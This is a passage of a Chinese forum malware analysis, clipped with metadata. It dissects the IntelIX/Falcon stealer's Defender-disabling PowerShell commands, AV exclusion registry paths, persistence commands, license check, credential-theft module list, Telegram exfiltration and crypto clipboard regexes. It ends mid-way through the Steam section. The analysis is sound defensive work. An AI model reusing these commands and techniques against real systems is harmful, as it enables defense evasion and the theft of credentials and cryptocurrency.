---
title: 【看雪】深度拆解 IntelIX/Falcon：恶意软件即服务（MaaS）攻击链全流程
source: https://bbs.kanxue.com/thread-292865.htm
source_host: bbs.kanxue.com
clip_date: 2026-09-06T11:11:20+08:00
trace_id: 9f29f669-947e-4f58-b7d0-3f89af6eba33
content_hash: d3314071524d601aaa00cf0df41d1fd86b035b4cdb122a6c62978715dad9f0b0
status: synced
tags:
  - 看雪
  - 恶意样本
  - MaaS
series: null
feed_source: 看雪·逆向工程
ai_summary: IntelIX/Falcon 是一款采用 MaaS 商业模式的 .NET 复合型窃密木马，通过致盲主流安全软件、内存打包窃取 60 余类资产并经 Telegram 回传，最后常驻剪贴板替换加密货币地址实施盗币。
ai_summary_style: key-points
images_status:
  total: 51
  succeeded: 51
  failed_urls: []
notion_page_id: 3d375244-d011-8162-b71a-e1796fc27359
ioc:
  cves: []
  cwes: []
  hashes:
    - 1fc3676e9b6dee2ed1d7dff47a0363a7
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> IntelIX/Falcon 是一款采用 MaaS 商业模式的 .NET 复合型窃密木马，通过致盲主流安全软件、内存打包窃取 60 余类资产并经 Telegram 回传，最后常驻剪贴板替换加密货币地址实施盗币。
> 
> - **授权校验暴露 MaaS 模式：** 载荷用 `FalconClient/1.0` User-Agent 请求 `license.php?key=china`，后台返回非 VALID 或 EXPIRED 则直接退出，表明该木马按授权渠道售卖，买家不续费则感染端自毁。
> - **防御致盲与动态白名单：** 通过注册表策略和隐藏 PowerShell 禁用 Defender 实时监控；在 %TEMP% 创建随机 GUID 目录，并循环向 360、卡巴斯基、火绒、腾讯等 10 余款杀软注册表排除项注入该路径，使恶意目录被“绝对信任”。
> - **纵深窃密与无文件打包：** 分三阶段执行；启动参数带 `--run-once` 时以 `crashreport.txt` 标记防止重复收割；并发运行 60 余个窃密模块，把文件流直接压缩进内存 `InMemoryZip`，同时强杀 Chrome/Edge 等 63 种浏览器进程释放 SQLite 锁，全程不触碰硬盘。
> - **高价值目标更深：** 窃取 Steam `ssfn` 授权文件与 `loginusers.vdf`，以 Windows 账号名作 DPAPI 附加熵解密 `local.vdf` 中的 Refresh Token，可绕过 Steam Guard 2FA；浏览器模块还记录信用卡、AutoFill、IBAN、恢复令牌等，瞄准账号接管与资金盗刷。
> - **末端剪贴板劫持：** 释放伪装成 `WinDefender.exe`/`svchost.exe` 的第三阶段组件，通过 Run 键、启动文件夹、计划任务等多重持久化；每 200ms 用正则匹配 BTC/ETH/LTC/TRC20 等地址并替换为攻击者钱包，实施长期静默盗币。

近年来，凭据窃取型木马已成为全球网络黑产中蔓延最快、危害最广的威胁之一。同时， MaaS（恶意软件即服务，Malware-as-a-Service）这一商业化黑产模式的泛滥，使得高危害恶意代码，能够以极低的技术门槛在暗网和黑产通道中快速流通，对全球网络供应链及个人数字财产造成了深远的冲击。

近日，安全团队捕获并分析了一款面向这一黑产背景的.NET (C#) 信息窃取与剪贴板劫持复合型木马（内部项目代号或家族标识为 IntelIX / Falcon）。该恶意软件采用典型的 MaaS 商业模式，具备多阶段纵深执行逻辑。

在其生命周期中，该恶意软件首先通过篡改系统注册表与劫持命令行，致盲包括 Windows Defender 在内的十余款主流安全软件；随后拉取核心载荷，利用无文件内存压缩技术，对受害主机的游戏账号、浏览器凭证、通讯软件进行洗劫，并将数据打包通过 Telegram 机器人回传；最终，恶意软件并未退出，而是转化为常驻内存的剪贴板劫持器，长期监控并篡改受害者的加密货币交易地址。该恶意软件对个人隐私、数字资产及内网安全构成了严重的威胁。

## 二、危害评估

该恶意软件潜在危害可划分为以下四个维度：

**1.系统防线彻底瘫痪（防御规避风险）：** 恶意软件强制关闭 Defender 实时保护，并对系统环境进行指纹嗅探，将恶意工作目录动态注入卡巴斯基、360、火绒等 10 余款主流杀毒软件的白名单中。这导致受害主机不仅对该恶意软件敞开大门，更使其极易遭受后续其他勒索软件或远控木马的二次感染。

**2.高价值核心资产泄漏（数据泄露风险）：** 该木马的窃密目标覆盖 60 余类高价值资产，影响范围包括Steam、Epic、战网等游戏平台账号、浏览器敏感数据、通讯软件会话、远程连接凭据、数据库连接信息、代码仓库令牌、VPN 配置和内网穿透工具等。一旦相关信息外泄，可能造成账号被盗、数据泄露、远程控制、内网访问通道暴露等多类风险。

> 主要窃取目标如下：
> 
> -   各游戏平台与虚拟资产（详见文末附录-1）
>     
> -   开发者、运维的远程连接凭据（详见文末附录-2）
>     
> -   即时通讯、社交与邮件（详见文末附录-4）
>     
> -   VPN 网络与内网跳板资产（详见文末附录-5）
>     

**3.直接经济损失（财务盗窃风险）**： 恶意软件末期释放的剪贴板劫持器支持 BTC、ETH、LTC、USDT (TRC20)、Solana 等主流区块链资产的正则嗅探与静默替换。受害者在转账时一旦疏忽，将遭受无法追回的直接经济损失。

> 其主要窃取目标如下：
> 
> -   加密货币与电子钱包（详见文末附录-3）
>     

**4.深度持久化（系统驻留风险）：** 恶意软件采用了注册表（HKCU/HKLM Run键）、启动文件夹伪装（伪装为 svchost.exe）、高权限计划任务等多重交叉固化机制。

## 三、执行流程概览

该恶意软件的执行生命周期呈现出典型的“纵深攻击”特征，可清晰划分为三个递进的战术阶段：

**阶段一：防线瓦解与载荷投递**

**反分析与反多开：** 进行进程互斥与高密度睡眠延时，消耗自动化沙箱的审计时间。

**杀软致盲：** 篡改组策略注册表并调用 PowerShell 禁用 Defender；动态生成随机 GUID 目录并将其强行注入 10 余款第三方杀软的排除项（白名单）。

**载荷拉取与驻留：** 模拟合法浏览器 User-Agent 下载核心载荷 core.exe，并实施四重持久化手段，最终通过高权限或隐蔽降级的方式执行载荷。

**阶段二：授权校验与高并发窃密**

**授权校验：** 向远程服务器发起 HTTP 请求验证买家授权状态，受控于凭证服务器。

**环境肃清：** 强制终止 60 余种浏览器及安全相关进程，解除本地数据库文件（如 Login Data）的独占占用锁。

**无文件窃密：** 并发调度数十个窃密模块，将敏感文件和解密后的凭证直接写入 RAM 中的内存 ZIP 压缩包（InMemoryZip）。

**战报回传：** 生成包含受害者硬件指纹与资产统计的结构化 Telegram 战报，连同窃密压缩包一并发送至攻击者私有频道。

**阶段三：长尾收益与剪贴板劫持 (Resident Clipper)**

**常驻监控：** 完成快进快出窃密后，释放第三阶段组件并沉淀至系统后台执行无限循环。

**静默替换：** 以每 200 毫秒的高频嗅探系统剪贴板，利用正则表达式识别用户复制的加密货币钱包地址，将其替换为攻击者预设的黑地址，实施长期的敛财。

## 四、多阶段执行流分析

## 阶段一

该恶意软件的初始化函数内容如下。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9b04a47b97307bb2.webp)

**杀软致盲**

恶意软件在启动后首先检测自己是否已经被运行，防止多开实例造成未知错误。

在阶段一中，恶意软件在执行核心窃密载荷前会尝试关闭反病毒服务。其内部实现了名为 DisableDefender 的方法，旨在瘫痪本地 Windows Defender 的防护能力。

恶意软件首先尝试直接修改 HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection（路径经密文存储，动态解密）下的键值，通过注入 DisableAntiSpyware 和 DisableRealtimeMonitoring 从系统策略层面关闭实时防病毒扫描。

如果因为其他系统组件或EDR对注册表敏感核心键值有严密的保护而导致直接修改失败。恶意软件则利用.NET Process 模块静默拉取一个隐藏的 powershell.exe 进程，强制下发 Set-MpPreference -DisableRealtimeMonitoring $true 指令用来禁用实时监控。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bfbd922b4039ffac.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d7bb5396ef5b07ec.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9bae9f0bb3dc3bd9.webp)

恶意软件在成功规避初始检测后，在本地构建了一个隐蔽的杀软检测排除目录。

在执行流中，恶意软件首先在系统的临时目录（%TEMP%）下动态创建一个专属的工作文件夹。这种利用 GUID 截取前 8 位并随机生成目录的手段，用于避开基于固定文件路径的传统 IOC 路径检测。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d6a16d657fb26ac1.webp)

随后调用内部实现的方法将刚刚创建的随机临时目录添加到杀毒软件的扫描排除路径中。核心代码片段如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/258eb050127c334a.webp)

恶意软件首先尝试直接篡改注册表策略键（Q8W4K.r7，其值为 HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths ），随后利用隐藏窗口的 powershell.exe 静默执行 Add-MpPreference ExclusionPath "\[路径\]"。确保该目录在 Windows 自带防护中被绝对信任。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7fb5a2f77d299608.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e45ca31a635e5927.webp)

恶意软件内部维护了一个包含 10 个安全厂商特征的列表（av1 至 av10，通过 Q8W4K.D 动态解密，涵盖如 360、火绒、卡巴斯基、腾讯电脑管家 等主流杀软的进程名或服务名）。恶意软件通过遍历本地已安装/运行的安全防护列表，实施定向致盲。一旦检测到对应的杀软环境，循环体内会触发针对性的注册表篡改。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f2f40ec58081d853.webp)

内置的安全厂商和配置项名单如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3f69596476c6afc5.webp)

以下是恶意软件内部 Addexclusions 方法遍历的完整动态白名单路径。

> 标识 | 检测厂商 (avX) | 定向注入的白名单注册表路径 (avRX)
> 
> 1 | 360 | SOFTWARE\\360Safe\\scan\\Trusted （360安全卫士信任区）
> 
> 2 | kaspersky | SOFTWARE\\KasperskyLab\\Exclusions （卡巴斯基排除项）
> 
> 3 | avast | SOFTWARE\\AVAST Software\\Avast\\Exclusions （Avast 排除项）
> 
> 4 | avg | SOFTWARE\\AVG\\Exclusions （AVG 排除项）
> 
> 5 | bitdefender | SOFTWARE\\Bitdefender\\Exclusions （比特梵德排除项）
> 
> 6 | eset | SOFTWARE\\ESET\\Exclusions （ESET/NOD32 排除项）
> 
> 7 | norton | SOFTWARE\\Norton\\Exclusions （诺顿排除项）
> 
> 8 | mcafee | SOFTWARE\\McAfee\\Exclusions （迈克菲排除项）
> 
> 9 | huorong | SOFTWARE\\Huorong\\Sysdiag\\WhiteList （火绒安全软件白名单）
> 
> 10 | tencent | SOFTWARE\\Tencent\\TAV\\Exclusions （腾讯电脑管家排除项）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a684c1daa20c0e4f.webp)

**载荷投递与系统驻留**

当恶意程序通过前置的 DisableDefender 和 AddExclusions 将工作空间（tDir）彻底从安全软件的视线中剥离后，执行流进入了最终的纵深攻击阶段。主控逻辑通过严格的串联（拉取 持久化 执行）来确保恶意核心载荷（core.exe）的绝对落地。

该恶意软件调用 DownloadPayload() 获取下一阶段的载荷。通过调用 Q8W4K.DecU(Q8W4K.eU) 动态还原出下载链接，并为 WebClient 强行注入了解密后的合法浏览器 User-Agent（变量 r3 ，Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36）。该恶意软件并没有直接将文件下载为最终形态，而是先下载为一个看似随机的临时文件（如 d_a1b2c3.exe）。经过 800 毫秒的休眠后，再调用 File.Move 将其重命名为真正的隐藏核心：core.exe。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b79aa46e8cd1d6fc.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0561840eb4bfba82.webp)

为了实现持久化，AddToStartup 方法堆叠了 4 种相互独立的启动机制，只要其中任意一种权限尝试成功，恶意软件就能实现开机自启。

**系统/用户级注册表劫持**

恶意软件同时向系统级（HKLM）和当前用户级（HKCU）的经典自启注册表键(r1，SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) 中注入键值。注入的键名使用了r2 变量明文 SysCore。试图通过冒充操作系统核心组件的名称，在受害者审查 msconfig 或任务管理器启动项时进行视觉欺骗。

Registry.LocalMachine.CreateSubKey(SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) // HKLM

Registry.CurrentUser.CreateSubKey(SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) // HKCU

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e2dfea8463202c9f.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/863d46ede098f723.webp)

**Startup 目录下的 Internet 快捷方式伪装**

如果注册表被某些防护软件锁死，恶意软件会尝试直接向系统的“启动”文件夹（Startup Folder）写入一个物理文件（%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SysCore.lnk, r4 变量为 SysCore.lnk）

> \[InternetShortcut\]
> 
> URL=file:///C:/Users/Admin/AppData/Local/Temp/Wxxxxxxx/core.exe

恶意软件并没有通过复杂的 COM 接口去创建一个标准的二进制 Windows 快捷方式（.lnk），而是直接写入了一段纯文本的 Internet 快捷方式（.url 格式，但后缀强行命名为.lnk）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7ae3dc3ae932b6f3.webp)

**计划任务创建**

> 恶意软件会直接启动系统自带的 schtasks.exe，强制下发一条指令:
> 
> /tn "SysCoreUpdate"：创建一个名为“系统核心更新”的计划任务。
> 
> /sc onlogon：将其触发条件设置为任何用户登录系统时。
> 
> /rl highest：极其危险——要求系统必须以最高可用的管理员权限（Highest Privilege）启动该任务。
> 
> /f：强制覆盖同名任务。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e6952ada51490c71.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1fce5dac0f801d85.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d37a47414411ce78.webp)

当下载完成并做完持久化任务之后，主控流程立刻调用 ExecutePayload 激活下一阶段Payload。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c60e7efbe3faf506.webp)

恶意软件首先调用 Windows 底层的 ShellExecute API，并传入了极其关键的 runas 强制要求以管理员权限运行 core.exe。如果当前用户不是管理员，代码底层的 catch 块会立刻执行回退。它会调用标准的.NET Process.Start，并配置 WindowStyle = ProcessWindowStyle.Hidden 和 CreateNoWindow = true，以当前用户的普通权限，在后台完全隐蔽、不弹出任何黑框地把恶意程序跑起来。

## 阶段二

**MaaS 模式暴露**

在阶段二的入口处，恶意软件并没有立即调用数据收割功能，而是首先通过 WebClient 向服务端发起了一次同步的 HTTP 握手。

> webClient.Headers.Add("User-Agent", "FalconClient/1.0");

恶意软件在发起请求时，显式地将 HTTP 请求头中的 User-Agent 伪装/硬编码为 FalconClient/1.0。该恶意软件的内部项目代号或开发名称极大概率被称为 “Falcon”（猎鹰）窃密器。

> string text = webClient.DownloadString("http://【攻击者域名】/license.php?key=china");

恶意软件请求的后端路由为 license.php，并携带了参数 key=china。

> if (!text.Contains("VALID") || text.Contains("EXPIRED"))
> 
> {
> 
> Environment.Exit(0);
> 
> return;
> 
> }

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d32ba9ac5ec6699b.webp)

上面这段代码暴露了该恶意软件极大概率采用了 MaaS 的商业黑产模式。恶意软件的编写者将生成出的恶意软件出租或售卖给不同的下线黑客。如果下线黑客的软件授权到期、或者没有续费，攻击者只需要在后台将该渠道的状态改为 EXPIRED（过期）或非 VALID，所有已感染的恶意软件就会在这一步自杀，买家将无法接收到任何新的盗号日志。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/018fc1970a15df8a.webp)

**剪切板劫持器释放**

该恶意软件通过Base64编码将二进制软件嵌入在程序中，在运行时解码来避免静态特征扫描与字符串明文暴露。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e28f661885561131.webp)

利用 File.WriteAllBytes 将解码出来的真实恶意字节流（array）释放到系统的临时目录（%TEMP%）下，并将落地可执行文件强制命名为：WinDefender.exe。载荷落盘后，恶意软件立即通过配置.NET ProcessStartInfo 属性将其静默拉起。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cda2c71ed7bdfe77.webp)

**纵深收割与战报生成**

当二级载荷（WinDefender.exe）在后台被静默拉起后，执行流随即进入无差别的本地资产“大扫荡”阶段。该段核心代码负责初始化运行环境、并发调度数十个窃密子模块、强制中断系统进程，并最终将所有数据打包通过 Telegram 异步外发。

恶意软件实现了一个变相的单实例互斥锁（Mutex）机制。如果启动参数包含 --run-once，恶意软件会在其当前根目录下创建了一个名为 crashreport.txt 的文件。攻击者故意使用崩溃报告这一极具欺骗性的文件名。如果该文件已存在，说明当前机器已被成功感染并执行过收割，恶意软件将直接退出。这不仅能防止由于重复收割导致的流量异常和系统卡顿，还能在受害者偶然看到该文件时，将其误认为是程序崩溃留下的普通日志。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3d90fa415bbf5a94.webp)

为了快速卷走所有数据，恶意软件采用了 C# 异步多线程架构。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/037e98d96ff6b41e.webp)

恶意软件创建了一个自定义类 InMemoryZip，这是一个线程安全的内存 ZIP 构建器。它实例化了 using (InMemoryZip zip = new InMemoryZip())，将后续所有模块搜刮到的文件流、密码文本直接在 RAM 中进行虚拟 Zip 压缩实现完全无文件内存打包。全流程不触碰硬盘。

该恶意软件启动了三个并发任务：

**任务一**

异步调用 IpApi.GetPublicIp()，在后台静默向公网 API 请求受害者的真实外部 IP 地址。

**任务二**

恶意软件内置了一个庞大的目标集合（Program.targets），其内部包含了 60余个实现了 ITarget 接口的独立窃密子模块。 恶意软件通过 Parallel.ForEach 对这些模块进行全线程池并发调度。每个实例调用其专属的 target.Collect(zip, counter) 方法，将对应资产（如 Steam、FTP、各类 VPN、桌面加密钱包、即时通讯会话等）并发写入内存 ZIP。

代码在 Collect 外层包裹了独立的 try-catch。这意味着单个资产目标的搜刮失败绝不会导致主线程崩溃，所有局部错误仅会被追加到全局内存错误日志 Error.txt 中，极大地保证了该恶意软件运行的健壮性。

> public static List<ITarget> targets = new List<ITarget>
> 
> {
> 
> new ScreenShot(), // 屏幕截图
> 
> new GameList(), // 已安装游戏清单
> 
> new InstalledBrowsers(), // 已安装浏览器列表
> 
> new InstalledPrograms(), // 已安装程序列表
> 
> new ProcessDump(), // 进程内存转储
> 
> new ProductKey(), // Windows 激活密钥
> 
> new SystemInfo(), // 系统信息（CPU/内存/OS/杀软）
> 
> new WifiKey(), // 本机 Wi-Fi 明文密码
> 
> new Telegram(), // Telegram 会话文件
> 
> new Discord(), // Discord 访问令牌
> 
> new Element(), // Matrix 通讯客户端
> 
> new Icq(), // ICQ 即时通讯凭证
> 
> new MicroSIP(), // SIP 软电话凭证
> 
> new Jabber(), // XMPP/Jabber 凭证
> 
> new Outlook(), // Outlook 邮件配置与密码
> 
> new Pidgin(), // Pidgin 即时通讯凭证
> 
> new Signal(), // Signal 通讯数据
> 
> new Skype(), // Skype 聊天数据库
> 
> new Tox(), // Tox 即时通讯凭证
> 
> new Viber(), // Viber 聊天数据库
> 
> new Minecraft(), // Minecraft 启动器令牌
> 
> new BattleNet(), // 暴雪战网登录凭证
> 
> new Epic(), // Epic Games 登录会话
> 
> new Riot(), // 拳头游戏会话票据
> 
> new Roblox(), // Roblox 安全令牌
> 
> new Steam(), // Steam 授权文件与配置
> 
> new Uplay(), // Uplay（育碧）客户端
> 
> new XBox(), // Xbox Live 令牌
> 
> new Growtopia(), // Growtopia 游戏数据
> 
> new ElectronicArts(), // EA 游戏平台本地配置
> 
> new Rdp(), // 远程桌面连接缓存
> 
> new AnyDesk(), // AnyDesk 无人值守密码
> 
> new CyberDuck(), // CyberDuck 云存储密钥
> 
> new DynDns(), // 动态 DNS 账户信息
> 
> new FileZilla(), // FileZilla FTP 账号密码
> 
> new Ngrok(), // Ngrok 内网穿透令牌
> 
> new PlayIt(), // PlayIt 隧道配置文件
> 
> new TeamViewer(), // TeamViewer 访问密码
> 
> new WinSCP(), // WinSCP 连接密码
> 
> new TotalCommander(), // Total Commander FTP 凭证
> 
> new FTPNavigator(), // FTP Navigator 客户端密码
> 
> new FTPRush(), // FTPRush 客户端密码
> 
> new CoreFtp(), // CoreFTP 客户端密码
> 
> new FTPGetter(), // FTPGetter 客户端密码
> 
> new FTPCommander(), // FTPCommander 客户端密码
> 
> new TeamSpeak(), // TeamSpeak 服务器认证
> 
> new Obs(), // OBS 直播配置（可能含流密钥）
> 
> new GithubGui(), // GitHub Desktop 访问令牌
> 
> new NoIp(), // No-IP 动态域名账户
> 
> new FoxMail(), // Foxmail 邮件配置
> 
> new Navicat(), // Navicat 数据库连接密码
> 
> new RDCMan(), // 微软远程桌面管理器配置
> 
> new Sunlogin(), // 向日葵远程控制访问码
> 
> new Xmanager(), // Xshell/Xftp 凭证
> 
> new JetBrains(), // JetBrains IDE 缓存凭证
> 
> new PuTTY(), // PuTTY SSH 会话与私钥
> 
> new Cisco(), // 思科 AnyConnect VPN
> 
> new RadminVPN(), // Radmin VPN 虚拟网络身份
> 
> new CyberGhost(), // CyberGhost VPN 凭证
> 
> new ExpressVPN(), // ExpressVPN 凭证
> 
> new HideMyName(), // HideMyName VPN 凭证
> 
> new IpVanish(), // IPVanish VPN 凭证
> 
> new MullVad(), // Mullvad VPN 凭证
> 
> new NordVpn(), // NordVPN 凭证
> 
> new OpenVpn(), // OpenVPN 配置文件与证书
> 
> new PIAVPN(), // Private Internet Access VPN
> 
> new ProtonVpn(), // ProtonVPN 凭证
> 
> new Proxifier(), // Proxifier 代理链配置
> 
> new SurfShark(), // Surfshark VPN 凭证
> 
> new Hamachi(), // Hamachi 虚拟网络身份
> 
> new WireGuard(), // WireGuard 私钥配置文件
> 
> new SoftEther(), // SoftEther VPN 配置
> 
> new CryptoDesktop(), // 桌面端加密货币钱包
> 
> new Grabber(), // 文件爬取器（窃取桌面文档）
> 
> new UserAgentGenerator(), // 生成随机 User-Agent 规避风控
> 
> new CryptoChromium(), // Chromium 内核浏览器加密钱包插件
> 
> new CryptoGecko() // Firefox 内核浏览器加密钱包插件
> 
> };

**任务三**

由于基于 Chromium 和 Gecko 内核的现代浏览器在运行时会对本地密码数据库（如 Login Data）和 Cookie 文件施加独占的 SQLite 文件锁，直接读取会导致异常。为了扫清障碍，该恶意软件内置了一份包含 63 种 浏览器及相关套件的进程黑名单（Targets 数组）。恶意软件在执行 Chromium 和 Gecko 窃密模块前，会抢先遍历上述黑名单，无差别、强行杀死正在运行的所有匹配进程。这是窃密恶意软件的常见手法。内置名单如下：

> public static string\[\] Targets = new string\[\]
> 
> {
> 
> "k-meleon.exe", "thunderbird.exe", "icedragon.exe", "cyberfox.exe", "blackhawk.exe", "palemoon.exe", "ghostery.exe", "sielo.exe", "conkeror.exe", "msedge.exe",
> 
> "netscape.exe", "seamonkey.exe", "slimbrowser.exe", "msedge_pwa_launcher.exe", "avant.exe", "opera.exe", "operagx.exe", "msedgewebview2.exe", "msedgewebview.exe", "chromium.exe",
> 
> "slimjet.exe", "chrome.exe", "browser.exe", "vivaldi.exe", "brave.exe", "edge.exe", "microsoft.exe", "dragon.exe", "torch.exe", "yandex.exe",
> 
> "sputnik.exe", "nichrome.exe", "msedge_proxy.exe", "cocbrowser.exe", "uran.exe", "msedge_proxy.exe", "chromodo.exe", "atom.exe", "bravebrowser.exe", "steam.exe",
> 
> "cryptotab.exe", "ghostbrowser.exe", "maelstrom.exe", "kinza.exe", "globus.exe", "falkon.exe", "elementbrowser.exe", "colibri.exe", "whale.exe", "avastbrowser.exe",
> 
> "ucbrowser.exe", "maxthon.exe", "blisk.exe", "aolshield.exe", "baidubrowser.exe", "ccleanerbrowser.exe", "hola.exe", "xvast.exe", "kingpin.exe", "qqbrowser.exe",
> 
> "private_browsing.exe", "chrome_pwa_launcher.exe", "chrome_proxy.exe"
> 
> };
> 
> public static List<ITarget> targetsBrowsers = new List<ITarget>
> 
> {
> 
> new Chromium(),
> 
> new Gecko()
> 
> };·

在并发搜刮全部结束后，恶意软件进入收尾的数据聚合阶段。恶意软件生成基于当前受害者计算机硬件特征（如 CPU、主板序列号或磁盘卷标）的唯一标识符（HWID）并记录收集到的用户的真实外部IP。

最后恶意软件对此前统计实例中归档的数据进行分析盘点，代码通过检测 counter.Vpns.Count、counter.Games.Count 等值，逐行追加已命中的资产大类。为了方便黑产买家（恶意软件使用者）在移动端实时接收通知，恶意软件将统计数据拼接成 Telegram 文本：

> ✨ New Log Received ✨
> 
> User: \[PC_Name/Username\] IP: \[Public_IP_Address\]
> 
> Main Loot: Passwords: \[总密码数\] Cookies: \[总Cookie数\] Wallets: \[加密货币钱包总数\]
> 
> Additional Data:???? VPN: \[命中数量\] Messengers: \[命中数量\] Games: \[命中数量\] Servers: \[FTP/SSH凭证命中数量\]

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/26168a3661dcef43.webp)

**最终外发执行：** 拼接完成后，主控进程在后台发起隐蔽的 HTTPS POST 请求，调用 Telegram Bot API，将包含所有窃取凭证、敏感文件和加密会话的 InMemoryZip 字节流（以 CompressionLevel.Fastest 最高速压缩级别打包）连同上述 HTML文本，发送至攻击者指定的私密聊天频道。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9c72c13d03c6f592.webp)

随着 Console.WriteLine("end."); 指令的隐蔽执行，恶意软件主进程静默退出。。

## 阶段三

在完成初始数据的外发后，恶意软件暴露出其长尾收益获取机制。

**持久化与剪贴板劫持**

为了确保该劫持器能够在机器上“生根发芽”，代码在初始化阶段实施了五重并发持久化动作：

> 1.HKCU Run键：写入名为 WinDefender 的自启项。
> 
> 2.HKLM Run键：尝试在系统级注册表中写入同名自启项（需提权）。
> 
> 3.Startup目录伪装：将自身拷贝至系统启动文件夹，并伪装为系统核心进程名称 svchost.exe。
> 
> 4.隐藏计划任务：利用 schtasks /Create /SC ONLOGON /TN WinDef 注册用户登录时自动触发的隐蔽计划任务。
> 
> 5.RunOnce键：最后再追加一次运行即销毁的备用自启注册表键。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/366c744b107ccdc6.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7ae3dc3ae932b6f3.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/325c9586b9c545d4.webp)

持久化完成后，代码进入一个 for (;;) 构建的无限死循环。它以每 200 毫秒一次的高频速率（Thread.Sleep(200)），监控受害者的操作系统剪贴板：

当受害者复制一段超过 20 个字符的文本时，该恶意软件会调用正则表达式对其进行财务特征匹配。

> ^\[13\]...|^bc1...：匹配 Bitcoin (BTC) 钱包地址。
> 
> ^0x\[a-fA-F0-9\]{40}$：匹配 Ethereum (ETH) 及兼容 EVM 链钱包地址。
> 
> ^\[LM\]...|^ltc1...：匹配 Litecoin (LTC) 钱包地址。
> 
> ^T\[a-km-zA-HJ-NP-Z1-9\]{33}$：匹配 Tron/USDT (TRC20) 钱包地址。
> 
> 此外还包含对 Solana (S) 和 Ripple/XRP (X) 的匹配规则。

一旦正则表达式确认用户刚刚复制的是某个加密货币的转账地址，恶意软件会瞬间调用 Clipboard.SetText(dictionary\["..."\])，将其替换为攻击者预先硬编码在字典中的对应币种黑地址。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc7080e656195783.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0c2a7d9ee980cf0d.webp)

## 危害分析：以Steam窃密为例

我们以该恶意软件对Steam游戏平台的窃密代码为例，展示该恶意程序的危害性。

木马首先尝试定位 Steam 客户端的物理安装路径，并执行初步的账号价值评估。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7e9c10699ec7396e.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d447a9115051beef.webp)

通过读取 HKCU\\Software\\Valve\\Steam 注册表项获取 SteamPath 后，木马会尝试遍历其 Apps 子键。该子键记录了用户曾经安装过的游戏 AppID（如 730 代表 Counter-Strike 2)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a8f9586952b7afea.webp)

由于新版 Steam 已逐渐将游戏库清单迁移至物理磁盘的 libraryfolders.vdf 中，部分受害者注册表中可能不存在 Apps 键值。 try-catch 自动进行静默降级处理，即使该探针抛出异常，也不会阻断后续的核心窃密流。

在确认物理路径后，恶意软件开始在磁盘上执行Steam核心凭证文件扫描。恶意软件遍历 Steam 根目录，匹配并抓取所有包含 ssfn 字符串的隐藏文件。ssfn 是 Steam 颁发的本地设备授权令牌。如果攻击者获取该文件即可进行设备克隆，并绕过 Steam Guard 双因素认证（2FA），实现在黑客设备上的异地免密登录。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/443875fae28b56ab.webp)

恶意软件扫描Steam安装目录的 config 目录下的所有.vdf （Valve Data Format）文件。这些文件不仅缓存了用户的 SteamID64，更是后续解密长效会话令牌的关键输入参数。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6bae2fe508e075e8.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0923601f63fd9923.webp)

之后该恶意软件会读取注册表中的 AutoLoginUser （自动登录账号）和 RememberPassword （记住密码）键值。

